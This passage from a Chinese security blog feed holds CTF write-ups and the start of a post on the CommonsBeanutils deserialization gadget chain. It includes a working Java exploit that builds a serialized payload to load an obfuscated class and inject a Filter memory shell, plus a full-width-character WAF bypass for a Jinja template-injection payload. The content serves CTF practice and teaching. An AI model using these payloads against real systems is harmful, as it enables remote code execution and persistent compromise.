class="keyword">new</span> <span class="title class_">byte</span>[<span class="built_in">this</span>.ClassByte.length];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.ClassByte.length; ++i) &#123;</span><br><span class="line">                    decrypted[i] = (<span class="type">byte</span>)(<span class="built_in">this</span>.ClassByte[i] ^ <span class="number">255</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="string">&quot;646566696e65436c617373&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; hex.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">                    sb.append((<span class="type">char</span>)Integer.parseInt(hex.substring(i, i + <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(sb.toString(), String.class, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">                m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                Class&lt;?&gt; clazz = (Class)m.invoke(loader, <span class="literal">null</span>, decrypted, <span class="number">0</span>, decrypted.length);</span><br><span class="line">                clazz.getConstructor().newInstance();</span><br><span class="line">                <span class="keyword">return</span> result.append(<span class="string">&quot; [Verified Context Loaded]&quot;</span>).toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">return</span> result.append(<span class="string">&quot; [Verification Failed]&quot;</span>).toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> result.append(<span class="string">&quot; [Status: STANDBY]&quot;</span>).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>sb</code>最后其实就是<code>defieClass</code></p><p><img src="/img/post/image-20260131000616200.png" alt="image-20260131000616200"></p><p><code>readObject()</code>方法在<code>UserProfileController</code>类下，<code>/api/user/settings/import</code>路由接收一个<code>configData</code>参数，内容可以是Base64字符</p><p>又有个条件，对输入流读取字符串需要内容为<code>InternalManager</code>，读取整型需要值为<code>2025</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/api/user&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProfileController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(UserProfileController.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/settings/import&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">importSettings</span><span class="params">(<span class="meta">@RequestParam(name = &quot;configData&quot;)</span> String configData)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] rawData = Tools.base64Decode(configData);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(rawData));</span><br><span class="line">            <span class="type">String</span> <span class="variable">identity</span> <span class="operator">=</span> ois.readUTF();</span><br><span class="line">            <span class="type">int</span> <span class="variable">version</span> <span class="operator">=</span> ois.readInt();</span><br><span class="line">            <span class="comment">//又一个判断条件</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;InternalManager&quot;</span>.equals(identity) &amp;&amp; version == <span class="number">2025</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                logger.info(<span class="string">&quot;Config Sync Status: Object [&#123;&#125;] has been integrated into system context.&quot;</span>, obj);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;SUCCESS: Configuration synchronized at internal level.&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;FAILED: Identity verification failed.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR: Malformed configuration stream.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致的方法梳理完了，现在知道核心是触发<code>ConfigDataWrapper.toString()</code>加载恶意类，那就需要在反序列化时能够自动触发到它。其实可以想到CC5中的入口<code>BadAttributeValueExpException.readObject()</code>调用了其<code>val</code>字段的<code>toString()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么入口类的构建流程就和CC5一致了，只要让<code>val</code>的值为<code>ConfigDataWrapper</code>实例就行</p><p>我们试着在类加载的时候动态注入Filter内存马，该类的静态代码块执行时实例化一个恶意Filter并执行注册流程，恶意被加载类的构建和SpringBoot注入Filter内存马的流程可以看<a href="https://leyi.live/2026/01/20/%E6%95%A3%E9%A2%981-20/">散题1.20</a>的最后一部分</p><p>前面<code>ConfigDataWrapper</code>对字节数组进行了一次异或，我们再异或一次就是原字节数组了</p><p>根据前面的分析构建Exp</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unictf.ctf.tools.ConfigDataWrapper;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\serialize\\UniJava\\target\\classes\\InjectClass.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class="line">            encrypted[i] = (<span class="type">byte</span>)(bytes[i] ^ <span class="number">255</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigDataWrapper</span> <span class="variable">configDataWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConfigDataWrapper</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">sign</span> <span class="operator">=</span> configDataWrapper.getClass().getDeclaredField(<span class="string">&quot;sign&quot;</span>);</span><br><span class="line">        sign.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        sign.set(configDataWrapper, <span class="string">&quot;ready&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">classByte</span> <span class="operator">=</span> configDataWrapper.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classByte.set(configDataWrapper, encrypted);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, configDataWrapper);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>)));</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;InternalManager&quot;</span>);</span><br><span class="line">        oos.writeInt(<span class="number">2025</span>);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往<code>/api/user/settings/import</code>路由注入Base64数据，显示成功</p><p><img src="/img/post/image-20260129132830831.png" alt="image-20260129132830831"></p><p>flag在环境变量中</p><p><img src="/img/post/33e3ce3ff96044db2f60b7e209fd1ac0.png" alt="33e3ce3ff96044db2f60b7e209fd1ac0"></p><br/><h2 id="Intrasight"><a href="#Intrasight" class="headerlink" title="Intrasight"></a>Intrasight</h2><p>这题是队友写的，这里我尝试复现</p><p>8001端口开了管理员服务，该端口下<code>/redirect_ws</code>会提供一次性的token，并将我们引导进9000端口</p><p><img src="/img/post/image-20260131002959413.png" alt="image-20260131002959413"></p><p>使用token与9000端口进行ws连接的建立，显示失败</p><p><img src="/img/post/image-20260131003327218.png" alt="image-20260131003327218"></p><p>缺少必要请求头<code>X-Internal-Token</code>和<code>origin</code>，补上后连接成功</p><p><img src="/img/post/image-20260131003848789.png" alt="image-20260131003848789"></p><p>测试得到template字段存在模板注入</p><p><img src="/img/post/image-20260131004600147.png" alt="image-20260131004600147"></p><p>修改payload获取flag</p><p><img src="/img/post/image-20260131004636635.png" alt="image-20260131004636635"></p><br/><h2 id="GlyphWeaver"><a href="#GlyphWeaver" class="headerlink" title="GlyphWeaver"></a>GlyphWeaver</h2><p>依旧是队友做出来的，此处为复现</p><p>有一个可以把不同样式导出为哈希的接口，这里对模板注入做了基础的WAF</p><p><img src="/img/post/image-20260131005440769.png" alt="image-20260131005440769"></p><p>这里需要使用<strong>全角字符绕过</strong>，又称Unicode 标准化 (NFKC) 漏洞。在 Python 的 Web 环境中，为了处理全球各地的字符输入，后端常使用 <code>unicodedata.normalize(&#39;NFKC&#39;, input)</code> 来统一字符格式，所以我们可以将字符变成全角的从而绕过WAF，因为题目提示说支持多种字体，推测校验是在转换成标准格式之前</p><p>字符转换的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_full_width</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将半角字符转换为全角字符&quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        code = <span class="built_in">ord</span>(char)</span><br><span class="line">        <span class="comment"># 处理基本拉丁字母和数字</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">33</span> &lt;= code &lt;= <span class="number">126</span>:  <span class="comment"># 可打印ASCII字符（不包括空格）</span></span><br><span class="line">            result.append(<span class="built_in">chr</span>(code + <span class="number">0xFEE0</span>))</span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&#x27; &#x27;</span>:  <span class="comment"># 半角空格转全角空格</span></span><br><span class="line">            result.append(<span class="string">&#x27;　&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line">test_text = <span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">full_width_text = to_full_width(test_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原文本:&quot;</span>, test_text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;全角文本:&quot;</span>, full_width_text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;长度对比:&quot;</span>, <span class="built_in">len</span>(test_text), <span class="string">&quot;→&quot;</span>, <span class="built_in">len</span>(full_width_text))</span><br></pre></td></tr></table></figure><p>绕过成功，获取flag</p><p><img src="/img/post/image-20260131120107585.png" alt="image-20260131120107585"></p><p>其他题目就等官方的WP了，我也在等</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> XML </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsBeanutils反序列化链</title>
      <link href="/2026/01/28/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
      <url>/2026/01/28/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsBeanutils反序列化链"><a href="#CommonsBeanutils反序列化链" class="headerlink" title="CommonsBeanutils反序列化链"></a>CommonsBeanutils反序列化链</h1><p>CommonsBeanutils是Apache提供的一款用于操作 JavaBean 的工具方法，该依赖在&lt;&#x3D;1.9.2版本存在反序列化高危漏洞，允许攻击者通过构造方法利用链在反序列化时进行远程代码执行</p><br/><h2 id="利用链原理"><a href="#利用链原理" class="headerlink" title="利用链原理"></a>利用链原理</h2><p>该链使用<code>TemplatesImpl</code>动态类加载的方式进行代码执行，先前我们知道需要触发该类的<code>newTransformer()</code>方法来进行类加载、实例化，该方法其实也被<code>TemplatesImpl.getOutputProperties()</code>调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>CommonsBeanutils依赖中，工具类<code>PropertyUtils</code>是一个用于获取JavaBean对象属性的类，其<code>getProperty()</code>方法接收一个Object对象和一个字符串，该方法用于返回字符串对应的字段值</p><p>该工具类调用的是<code>PropertyUtilsBean</code>的同名方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>PropertyUtilsBean</code>的<code>getProperty()</code>方法又调用了<code>getNestedProperty()</code>，由于<code>getProperty()</code>支持嵌套查询值，<code>getNestedProperty()</code>就是用于进行解嵌套的，获取最终要取值的对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getNestedProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="keyword">if</span> (bean == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No bean specified&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No name specified for bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">this</span>.resolver.hasNested(name)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">next</span> <span class="operator">=</span> <span class="built_in">this</span>.resolver.next(name);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nestedBean</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">                    nestedBean = <span class="built_in">this</span>.getPropertyOfMapBean((Map)bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isMapped(next)) &#123;</span><br><span class="line">                    nestedBean = <span class="built_in">this</span>.getMappedProperty(bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isIndexed(next)) &#123;</span><br><span class="line">                    nestedBean = <span class="built_in">this</span>.getIndexedProperty(bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    nestedBean = <span class="built_in">this</span>.getSimpleProperty(bean, next);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (nestedBean == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NestedNullException</span>(<span class="string">&quot;Null property value for &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                bean = nestedBean;</span><br><span class="line">                name = <span class="built_in">this</span>.resolver.remove(name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">                bean = <span class="built_in">this</span>.getPropertyOfMapBean((Map)bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isMapped(name)) &#123;</span><br><span class="line">                bean = <span class="built_in">this</span>.getMappedProperty(bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isIndexed(name)) &#123;</span><br><span class="line">                bean = <span class="built_in">this</span>.getIndexedProperty(bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bean = <span class="built_in">this</span>.getSimpleProperty(bean, name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> bean;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没有嵌套时，则会调用<code>getSimpleProperty()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSimpleProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="keyword">if</span> (bean == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No bean specified&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No name specified for bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.hasNested(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Nested property names are not allowed: Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isIndexed(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Indexed property names are not allowed: Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isMapped(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Mapped property names are not allowed: Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> DynaBean) &#123;</span><br><span class="line">            <span class="type">DynaProperty</span> <span class="variable">descriptor</span> <span class="operator">=</span> ((DynaBean)bean).getDynaClass().getDynaProperty(name);</span><br><span class="line">            <span class="keyword">if</span> (descriptor == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Unknown property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on dynaclass &#x27;&quot;</span> + ((DynaBean)bean).getDynaClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ((DynaBean)bean).get(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">PropertyDescriptor</span> <span class="variable">descriptor</span> <span class="operator">=</span> <span class="built_in">this</span>.getPropertyDescriptor(bean, name);</span><br><span class="line">            <span class="keyword">if</span> (descriptor == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Unknown property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">readMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.getReadMethod(bean.getClass(), descriptor);</span><br><span class="line">                <span class="keyword">if</span> (readMethod == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; has no getter method in class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);</span><br><span class="line">                    <span class="keyword">return</span> value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该方法前面进行了一系列检查，最后还是调用了反射方法<code>invokeMethod()</code>去取值，方法<code>readMethod</code>在<code>getReadMethod()</code>方法获取，如果<code>bean</code>为<code>TemplatesImpl</code>，<code>name</code>为<code>outputProperties</code>，获取的方法就是<code>getOutputProperties()</code></p><p><img src="/img/post/image-20260128173852093.png" alt="image-20260128173852093"></p><p>那么接下来寻找<code>getProperty()</code>的上层，<code>BeanComparator.compare()</code>调用了该方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(o1, o2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(value1, value2);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException iae) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException ite) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException nsme) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString());</span><br><span class="line">            &#125;</span><br><span 